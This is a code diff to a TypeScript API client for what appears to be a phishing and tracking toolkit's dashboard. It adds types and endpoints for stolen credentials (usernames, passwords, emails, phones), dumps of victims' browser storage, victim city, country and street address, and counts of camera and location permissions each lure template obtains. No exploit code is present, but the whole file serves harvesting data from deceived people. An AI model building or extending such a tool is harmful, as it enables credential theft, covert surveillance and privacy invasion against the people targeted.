@@ -15,6 +15,8 @@ export interface Stats {
   total_size_mb: number
   first_capture: number | null
   last_capture: number | null
+  total_credentials: number
+  total_storage_dumps: number
 }
 
 export interface Capture {
@@ -41,6 +43,7 @@ export interface Location {
   latitude: number
   longitude: number
   accuracy: number | null
+  address: string | null
   created_at: number
   maps_url: string
 }
@@ -53,6 +56,8 @@ export interface IpEntry {
   device: string | null
   browser: string | null
   os: string | null
+  city: string | null
+  country: string | null
   created_at: number
 }
 
@@ -69,6 +74,9 @@ export interface Template {
   id: string
   name: string
   description: string | null
+  total_served: number
+  total_camera_grants: number
+  total_location_grants: number
   created_at: number
 }
 
@@ -97,4 +105,32 @@ export const api = {
       body: JSON.stringify({ name, template_id: templateId })
     }).then(r => r.json()),
   deleteSession: (id: string) => fetch(`${API}/sessions/${id}`, { method: 'DELETE' }),
+  credentials: () => fetchJson<Credential[]>(`${API}/credentials`),
+  deleteCredential: (id: string) => fetch(`${API}/credentials/${id}`, { method: 'DELETE' }),
+  deleteAllCredentials: () => fetch(`${API}/credentials`, { method: 'DELETE' }),
+  storage: () => fetchJson<StorageDump[]>(`${API}/storage`),
+  deleteStorage: (id: string) => fetch(`${API}/storage/${id}`, { method: 'DELETE' }),
+  deleteAllStorage: () => fetch(`${API}/storage`, { method: 'DELETE' }),
 }
+
+export interface StorageDump {
+  id: string
+  session_id: string
+  ip_address: string | null
+  data: any
+  created_at: number
+}
+
+export interface Credential {
+  id: string
+  session_id: string
+  template_id: string | null
+  username: string | null
+  password: string | null
+  email: string | null
+  phone: string | null
+  ip_address: string | null
+  created_at: number
+}
+
+
